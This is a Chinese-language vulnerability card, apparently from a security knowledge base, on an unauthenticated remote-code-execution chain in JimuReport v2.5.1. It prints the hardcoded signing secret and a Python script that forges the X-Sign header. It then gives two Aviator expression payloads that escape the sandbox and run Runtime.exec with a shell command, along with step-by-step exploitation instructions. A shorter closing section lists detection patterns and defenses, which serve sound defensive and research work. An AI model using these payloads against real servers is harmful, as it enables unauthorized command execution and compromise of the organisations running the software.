---
id: web-java-component-jimureport-unauth-aviator-rce
title: JimuReport v2.5.1 硬编码打印插件签名 + Aviator 表达式注入未授权 RCE
type: scenario
domain: web
path: web/java/component
technique: jimureport-unauth-aviator-rce
tags:
- java
- jimureport
- jeecgboot
- aviator
- expression-injection
- hardcoded-secret
- unauthenticated
- rce
cve: []
severity: critical
confidence: high
affected_versions: JimuReport v2.5.1（jimureport-spring-boot4-starter:2.5.1）；原文称更早版本可能同样存在但未确认
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V24
  verified_at: '2026-11-05T03:05:55+08:00'
  notes: 已对照原文与3张图核对：@JimuNoLoginRequired+@JimuSignature、PRINT_PLUGIN_SIGN_SECRET 硬编码及 MD5(body+secret).upper() 分支、getBaseSql→ExpressUtil.a 对 '=' 开头值编译执行、InternalVars/seq 改写 features+functionMissing、两步请求 HTTP 200/PK 字节流与 calc 弹窗均一致；原文明确 v2.5.1（更早版本可能但未确认），已 set-versions。卡片最小 Python 骨架省略了原文请求中的 X-Timestamp 头（签名公式不含时间戳，分支代码也未校验；若目标额外校验需补该头），不影响核心链路。PoC 未在本机执行。
url: /docs/web/java/component/web-java-component-jimureport-unauth-aviator-rce/
draft: false
kb_aliases:
- 积木报表未授权 RCE
- JimuReport pre-auth RCE
- /jmreport/auto/export/python/plugin
- PRINT_PLUGIN_SIGN_SECRET
- JimuSignature 签名伪造
- JeecgBoot 报表 RCE
---

## 一句话结论

JimuReport v2.5.1 的 `POST /jmreport/auto/export/python/plugin` 同时标注“免登录”和“需签名”，但签名密钥硬编码在客户端依赖里，任何人可用 `X-Sign = MD5(body + 密钥).upper()` 伪造通过；请求体 `reportParams[].params` 中值以 `=` 开头的参数会被 `ExpressUtil` 交给 Aviator 执行，配合引擎内部变量 `__instance__` / `__env__` / `seq` 完成沙箱逃逸，最终 `Runtime.getRuntime().exec()` 执行任意命令。

## 原理

- **鉴权被两层“看似存在”的机制实际架空**：控制器方法同时带 `@JimuNoLoginRequired` 与 `@JimuSignature`。前者让 Token 拦截器直接放行（日志里 `Token=null` 也会处理请求）；后者负责校验请求头 `X-Sign`。
- **签名分支使用硬编码密钥**：签名拦截器对 `/auto/export/python/plugin` 走“打印插件导出”专用分支，用类内常量 `PRINT_PLUGIN_SIGN_SECRET = 6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121` 计算 `MD5(原始请求体 + 密钥)` 并与 `X-Sign` 比较。该常量随客户端 jar 公开，与服务端配置的 `jeecg.jmreport.signatureSecret` 无关，因此签名只是可自证的校验和，不具备身份凭证意义。
- **参数值被当作表达式求值**：请求进入 `IJimuReportAutoService.autoExport` → `exportMore` → `JmReportBaseServiceImpl.getBaseSql`，后者遍历 `queryJson` 的每个键，把值直接传给 `ExpressUtil.a(value, null)`。`ExpressUtil.a` 判断字符串 `trim()` 后以 `=` 开头，就去掉 `=` 调用 `AviatorEvaluatorInstance.compile(expr).execute(env)`。
- **沙箱配置存在结构性缺口**：该实例关闭了 `NewInstance` / `Use` / `Module` / `StaticMethods` / `StaticFields` 并清空 `ALLOWED_CLASS_SET`，却保留了 `InternalVars`（表达式可读 `__instance__`、`__env__`）以及内置 `seq` 函数和 `ForLoop`。攻击者因此能拿到引擎实例本身，改写它的 `features` 与 `functionMissing`，把禁用的反射能力重新打开，再从 `Class.forName` 走到 `Runtime.exec`。这一步的通用细节见关联卡“Aviator 表达式引擎沙箱逃逸”。
- **两道请求即可完成**：第一条表达式把引擎的 `functionMissing` 替换为 `JavaMethodReflectionFunctionMissing` 并补回反射相关 Feature，改动持久化在共享的 Aviator 实例中；第二条表达式直接反射取 `Runtime.getRuntime()` 并调用 `exec`。导出接口返回 ZIP 字节流，命令副作用在服务端真实发生。

## 触发条件

- 目标集成 `jimureport-spring-boot4-starter`（原文明示 2.5.1），且自动导出功能开启：配置项 `jeecg.jmreport.automate.export.enable-auto-export=true`（示例工程需手动开启）。
- 攻击者网络可达 `/jmreport/auto/export/python/plugin`；无需任何登录态或 Token。
- 需要一个服务端已存在的报表 id（原文使用示例库默认 id `891612623430320128`）；不同部署需替换为目标实例中真实存在的报表 id。
- 服务端 Aviator 版本与 payload 中的 Feature 枚举下标匹配（原文环境为 JimuReport 2.5.1 自带依赖）；不匹配时需先枚举 Feature 再构造。
- 命令以应用进程权限执行；Windows/Linux 均可，区别只在命令字符串。

## 利用步骤

1. 访问登录页或报表列表确认目标是 JimuReport；探测 `POST /jmreport/auto/export/python/plugin` 是否存在（未带签名时应返回签名校验失败而非 404）。
2. 取一个有效报表 id：登录后的报表列表、默认示例库或页面接口中可见的 `id` 字段。
3. 构造 STEP1 请求体，令 `reportParams[0].params.p` 为沙箱逃逸表达式；用硬编码密钥计算 `X-Sign`，发送 POST。
4. 构造 STEP2 请求体，令 `p` 为反射 `Runtime.exec` 的表达式；同样计算签名后发送。
5. 以命令副作用确认结果（写文件、`whoami`、弹计算器或带外回连）。接口即使返回异常，也要以副作用为准。

## PoC

签名与发送的最小骨架（Python 3 标准库）：

```python
import hashlib, json, urllib.request

SECRET = "6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121"
URL = "http://target:8090/jmreport/auto/export/python/plugin"
RID = "891612623430320128"  # 目标中真实存在的报表 id

def send(expr):
    body = json.dumps({"reportParams": [{"id": RID, "params": {"p": expr}, "exportType": "PDF"}],
                       "exportType": "PDF"}, separators=(",", ":"), ensure_ascii=False)
    sign = hashlib.md5((body + SECRET).encode()).hexdigest().upper()
    req = urllib.request.Request(URL, data=body.encode(),
        headers={"Content-Type": "application/json", "X-Sign": sign}, method="POST")
    return urllib.request.urlopen(req, timeout=30).read()
```

STEP1 沙箱逃逸（改写共享 Aviator 实例的 `features` 与 `functionMissing`）：

```text
=for x in __instance__.features { seq.put(__instance__.funcMap, '_sm', x.declaringClass.enumConstants[16]); seq.put(__instance__.funcMap, '_fn', x.declaringClass.enumConstants[8]) }; seq.add(__instance__.features, seq.get(__instance__.funcMap, '_sm')); seq.add(__instance__.features, seq.get(__instance__.funcMap, '_fn')); seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); seq.put(__env__, 'FM', CC.forName('com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing')); seq.put(__env__, 'RF', CC.forName('com.googlecode.aviator.utils.Reflector')); RF.setProperty(__env__, '__instance__.functionMissing', FM.getInstance()) * 1*4831927
```

STEP2 命令执行：

```text
=seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); seq.put(__env__, 'RT', CC.forName('java.lang.Runtime')); seq.put(__env__, 'r', RT.getRuntime()); exec(seq.get(__env__, 'r'), 'cmd.exe /c whoami') * 1*4831927
```

说明：`* 1*<随机数>` 让整条 `seq` 链作为数值表达式返回，避免结果处理异常；命令字符串按目标系统替换。以上为结构化复现，未在本会话执行。

## 变体与关联

- 关联：[[binary-pwn-sandbox-escape-aviator-internalvars-seq-reflection]]（本条链路的根因原语：Aviator 沙箱逃逸的通用构造）。
- 变体：其他调用 `ExpressUtil.a` / `getBaseSql` 且参数值可由请求控制的 JimuReport 接口，同样可复用“`=` 开头即求值”的注入面；`/jmreport/auto/export/plugin` 等其他自动导出路由也可能共享同一签名分支。
- 变体：若目标改掉了硬编码密钥但仍保留 `@JimuNoLoginRequired` 与表达式求值，则需要先获取或猜测服务端 `signatureSecret`，注入面本身不变。
- 边界：若自动导出被关闭、报表 id 不存在、Aviator 已移除 `InternalVars`/`seq` 或 Feature 枚举下标变化，本 payload 需相应调整或不再成立。

## 检测与防御

- 检测：访问日志中出现 `/jmreport/auto/export/python/plugin`，且 `Token=null`；请求体含 `reportParams`、`params`、`exportType`，参数值以 `=` 开头并含 `__instance__`、`__env__`、`seq.put`、`Class.forName`、`Runtime`、`functionMissing`。
- 检测：响应为 `application/octet-stream` 且以 `PK` 开头，但请求未登录；服务端在同一 JVM 内连续出现两条上述表达式。
- 检测：应用日志/EDR 中出现 `cmd.exe /c`、`/bin/sh -c` 等由 Java 报表进程派生的子进程。
- 防御：移除 `/auto/export/python/plugin` 分支的硬编码密钥，统一读取服务端配置并强制部署方替换默认值；移除该接口的 `@JimuNoLoginRequired`，叠加真实会话鉴权，签名只能作为防重放辅助。
- 防御：不要在 `getBaseSql` 中对用户可控参数值调用 `ExpressUtil.a`；确需计算时使用独立 Aviator 实例，关闭 `InternalVars`、`seq`、`ForLoop`，并对表达式做 AST 级函数/变量白名单。
- 防御：不需要自动导出时关闭 `jeecg.jmreport.automate.export.enable-auto-export`，或在网关层限制 `/jmreport/auto/export/**` 仅内网可达；及时跟进 Aviator 沙箱逃逸修复并升级依赖。
